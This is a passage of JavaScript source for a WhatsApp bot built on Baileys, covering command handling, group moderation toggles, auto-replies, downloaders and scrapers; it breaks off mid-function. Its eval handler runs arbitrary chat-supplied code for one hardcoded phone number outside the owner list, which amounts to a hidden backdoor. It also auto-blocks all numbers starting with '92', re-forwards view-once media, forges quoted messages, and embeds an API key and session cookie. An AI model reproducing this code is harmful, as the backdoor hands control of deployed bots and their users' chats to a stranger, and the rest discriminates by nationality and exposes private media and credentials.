require('./settings')
require('./lib/listmenu')
const { modul } = require('./module');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { rentfromxeon, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const xeonverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvideo.json'))
const BadXeon = JSON.parse(fs.readFileSync('./database/bad.json'))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${ownernumber}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const XeonTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = xeonverifieduser.includes(sender)
    	const banUser = await XeonBotInc.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>');
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
    
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "6281249122429") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await XeonBotInc.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				XeonBotInc.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}

if (!XeonBotInc.public) {
if (!m.key.fromMe) return
}

//chat counter (console log)
        if (m.message && m.isGroup) {
            XeonBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            XeonBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(xeonverifieduser, null, 2))
}

XeonBotInc.sendPresenceUpdate('available', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Dia Sedang AFK ${reason ? 'Dengan Alasan: ' + reason : 'Dengan Tanpa Alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Kamu Berhenti AFK${user.afkReason ? ' Setelah: ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//auto block pakistan number
if (m.sender.startsWith('92')) return XeonBotInc.updateBlockStatus(m.sender, 'block')

async function sendXeonBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await XeonBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcxeon2 = (teks) => {        
sendXeonBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
XeonBotInc.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
XeonBotInc.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await XeonBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
defaultpp = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
XeonBotInc.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//autoreply
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *ANTI VIEWONCE* 」\n├ *Nama:* ${pushname}\n├ *Pengguna:* @${m.sender.split("@")[0]}\n├ *Jam:* ${time2}\n└ *Pesan:* ${m.mtype}`
XeonBotInc.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`*Mungkin Sudah Dibuka*`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}


//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await XeonBotInc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Nama Saluran: *${ghed.player_response.videoDetails.author}*
Tautan Saluran: *https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}*
Judul: *${Lehd.meta.title}*
Durasi: *${Lehd.meta.duration}*
Deskripsi: *${ghed.player_response.videoDetails.shortDescription}*`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await XeonBotInc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await XeonBotInc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Nama Saluran: *${PlXz.player_response.videoDetails.author}*
Tautan Saluran: *https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}*
Judul: *${Puxa.meta.title}*
Durasi: *${Puxa.meta.duration}*
Deskripsi: *${PlXz.player_response.videoDetails.shortDescription}*`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await XeonBotInc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
XeonBotInc.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return XeonBotInc.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
